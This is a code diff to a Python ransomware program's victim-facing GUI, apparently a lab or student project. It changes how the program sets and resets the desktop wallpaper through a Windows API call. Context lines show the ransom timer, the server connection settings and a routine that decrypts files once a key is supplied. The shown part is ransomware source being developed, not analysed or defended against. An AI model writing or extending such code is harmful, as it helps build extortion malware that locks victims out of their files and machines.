@@ -37,8 +37,10 @@ class RansomwareGUI:
         self.server_ip = self.config['SERVER']['client_ip']
         self.server_port = self.config['SERVER']['client_port']
 
+        script_dir = os.path.dirname(os.path.abspath(__file__))
         self.save_old_wallpaper()
-        self.set_wallpaper(self.NEW_WALLPAPER)
+        wallpaper_path = os.path.join(script_dir, self.NEW_WALLPAPER)
+        self.set_wallpaper(wallpaper_path)
 
         self.setup_ui()
         self.start_timer()
@@ -58,14 +60,15 @@ class RansomwareGUI:
             file.write(buffer.value)
 
     def set_wallpaper(self, image_path):
-        SPI_SETDESKWALLPAPER = 0x0014
-        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
+        if os.path.exists(image_path):
+            SPI_SETDESKWALLPAPER = 20
+            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
+    
+    def set_default_wallpaper(self):
+        # Chemin vers le fond d'écran par défaut de Windows
+        default_wallpaper_path = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
+        self.set_wallpaper(default_wallpaper_path)
 
-    def restore_old_wallpaper(self):
-        if os.path.exists(self.OLD_WALLPAPER):
-            with open(self.OLD_WALLPAPER, 'r') as file:
-                old_wallpaper = file.read()
-            self.set_wallpaper(old_wallpaper)
 
     def load_timer(self):
         if os.path.exists(self.TIMER_FILE):
@@ -140,14 +143,12 @@ class RansomwareGUI:
             print(f"Exception levée : {e}")
             messagebox.showerror("Erreur", f"Une erreur inattendue s'est produite : {e}")
 
-
-
     def decrypt_files(self, symmetric_key):
         file_path = 'example.txt'
         decrypt_file(file_path, symmetric_key)
         messagebox.showinfo("Déchiffrement", "Vos fichiers ont été déchiffrés.")
         self.log_interaction("Fichiers déchiffrés avec succès")
-        self.restore_old_wallpaper()
+        self.set_default_wallpaper()
         self.root.destroy()
         if os.path.exists(self.TIMER_FILE):
             os.remove(self.TIMER_FILE)
